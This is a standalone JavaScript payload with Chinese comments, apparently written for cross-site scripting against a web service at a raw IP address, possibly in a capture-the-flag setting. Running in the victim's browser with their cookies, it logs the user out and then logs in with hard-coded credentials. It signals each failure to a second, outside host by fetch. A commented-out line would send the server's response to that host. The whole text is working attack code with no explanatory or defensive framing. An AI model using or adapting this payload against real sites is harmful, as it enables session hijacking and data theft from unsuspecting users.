!(function() {
    // 第一步：注销当前用户
    fetch('http://106.15.207.13:31545/logout', {
        method: 'GET',
        credentials: 'include'
    }).then(response => {
        if (!response.ok) {
            // 如果注销失败，GET请求你的网站进行标记
            fetch('http://120.26.103.53/1');
            throw new Error('Logout failed');
        }
        console.log('Logout successful');
        // 第二步：登录并尝试注册新用户
        return fetch('http://106.15.207.13:31545/login', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'username=qazedc&password=qazedc'
        });
    }).then(response => {
        if (!response.ok) {
            // 如果登录/注册失败，GET请求你的网站进行标记
            fetch('http://120.26.103.53/2');
            throw new Error('Login/Registration failed');
        }
        return response.text();
    }).then(result => {
        console.log('Login/Registration successful', result);
        // 可以在这里添加额外的处理逻辑，例如跳转页面等
        // 例如，使用获取到的结果构建URL并访问：
        // window.location.href = `http://120.26.103.53/para?data=${encodeURIComponent(result)}`;
    }).catch(error => {
        console.error(error);
        // 如果有错误，也可以选择标记错误类型
        // 例如: fetch('http://120.26.103.53/3');
    });
})();
